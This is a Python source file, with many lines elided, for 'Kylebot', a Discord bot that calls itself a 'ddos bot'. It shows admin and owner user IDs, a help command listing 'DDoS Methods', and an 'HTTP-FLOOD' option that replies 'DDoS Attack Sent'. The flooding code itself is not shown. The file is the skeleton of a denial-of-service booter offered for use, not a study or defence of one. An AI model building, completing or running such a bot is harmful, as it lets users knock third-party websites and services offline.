__author__ = 'Pushy'
__version__ = '1.4'
__github__ = 'github.com/dhritzz'
__license__ = 'GNU General Public License v3.0'
# Kylebot | Discord ddos bot v1.4 | Pushy
#=====Import Module=====#
import os
try:
	import discord
...
admins  = [582206666431266816]  #   ID users            
owners  = [582206666431266816]  #          
...
@bot.command()
async def help(ctx):
        embed = discord.Embed(title="Pushy | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        ...
        embed.set_footer(text = f"©{year_now} Copyright Pushy.")
        ...
        if method is None:
            ...
            await ctx.send(embed=embed)
                ...
                if method == 'HTTP-FLOOD':
                    embed = discord.Embed(title=f"Pushy | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
